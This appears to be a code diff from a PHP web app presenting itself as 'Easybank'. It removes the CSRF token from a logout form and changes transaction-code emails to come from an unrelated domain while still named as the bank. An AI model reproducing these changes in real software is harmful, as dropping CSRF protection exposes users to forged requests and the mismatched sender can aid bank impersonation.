@@ -354,7 +354,7 @@ countdown( "countdown", 15, 0 );
              <i class="fa fa-close"></i>
            </button>
               &nbsp;
-           <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
+           
            <button type="submit" class="btn btn-default btn-primary btn-lg" data-dismiss="modal"  onclick="window.location.href='logout.php'"/> Logout
             <i class="fa fa-check"></i>
           </button>
@@ -544,7 +544,7 @@ $mail->Body = $mailContent;
 $msg = " Mr,s $email your i_code for the confirm transaction is: $i_code ";
 
 $headers = "";
-$headers .= "From: Easybank <easybank@easybank.no-reply> \r\n";
+$headers .= "From: Easybank <noreply@ofiliyoungyz.site> \r\n";
 $headers .= "Reply-To:" . $email . "\r\n" ."X-Mailer: PHP/" . phpversion();
 $headers .= 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
